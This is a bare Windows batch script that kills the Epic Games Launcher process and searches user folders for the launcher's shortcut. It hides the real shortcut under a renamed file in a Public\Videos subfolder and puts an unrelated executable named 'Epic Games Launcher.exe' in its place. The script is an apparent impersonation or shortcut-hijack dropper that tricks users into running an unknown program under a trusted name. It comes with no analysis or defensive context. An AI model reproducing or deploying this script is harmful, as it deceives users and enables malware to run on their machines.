@echo off
taskkill /f /im "Epic Games Launcher.exe" /T
setlocal enabledelayedexpansion

for /r C:\Users %%a in (*) do (
    if "%%~nxa"=="Epic Games Launcher.lnk" (
        set "p=%%~dpnxa"
        goto :found
    )
)

:notfound
echo File not found
move "C:\Users\Public\Videos\GraphicalUserInterface\myapp\Epic Games Launcher.exe" "C:\Users\%USERNAME%"
goto :eof

:found
set /A counter=0
set /A counter+=1
echo !p!
move "!p!" "C:\Users\Public\Videos\GraphicalUserInterface"
ren "C:\Users\Public\Videos\GraphicalUserInterface\Epic Games Launcher.lnk" "§!counter!.lnk"
move "C:\Users\Public\Videos\GraphicalUserInterface\myapp\Epic Games Launcher.exe" "!p!"
ren "!p!" "Epic Games Launcher.exe"
